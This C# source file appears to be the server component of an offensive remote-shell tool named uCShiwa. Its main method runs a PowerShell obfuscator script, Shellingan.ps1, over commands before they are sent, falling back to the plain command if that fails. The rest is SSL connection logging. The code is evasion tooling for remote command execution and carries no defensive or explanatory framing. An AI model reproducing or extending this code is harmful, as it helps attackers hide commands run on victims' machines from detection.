using System;
using System.Net;
using System.Net.Security;
using System.Net.Sockets;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.IO;
using System.Management.Automation;
using System.Collections.ObjectModel;
using System.Threading;
using System.Security.Authentication;

namespace uCShiwa
{
    public class UServer
    {
        public static async void ULog(string message)
        {
            using (StreamWriter logfile = File.AppendText("Ulog.txt"))
            {
                logfile.WriteLine("{0}:{1}", DateTime.Now, message);
            }
        }

        public static string ObfuscatePwsh(string message)
        {
            string obfcmd = String.Empty;
            try
            {
                using (PowerShell ps = PowerShell.Create())
                {
                    string script = File.ReadAllText(".\\Shellingan.ps1");
                    ps.AddScript(script);
                    ps.Invoke();
                    ps.AddStatement().AddCommand("Invoke-Shellingan").AddParameter("cmd", message).AddParameter("iex", true).AddParameter("recurse", "1");
                    Collection<PSObject> results = ps.Invoke();
                    foreach (PSObject result in results)
                    {
                        obfcmd += result.ToString();
                    }
                    ps.Commands.Clear();

                }
            }
            catch(Exception e)
            {
                Console.WriteLine(e.InnerException);
                Console.WriteLine("<0> Obfuscation error: original command sended");
                obfcmd = message;
            }
            //Console.WriteLine(obfcmd);
            return obfcmd;
        }


        


        public static void printConnection(SslStream sslStream)
        {
            Console.WriteLine("Cipher: {0}", sslStream.CipherAlgorithm);
            Console.WriteLine("Hash: {0}", sslStream.HashAlgorithm);
            Console.WriteLine("Key exchange: {0}", sslStream.KeyExchangeAlgorithm);
            Console.WriteLine("Protocol: {0}", sslStream.SslProtocol);
        }
    }
}
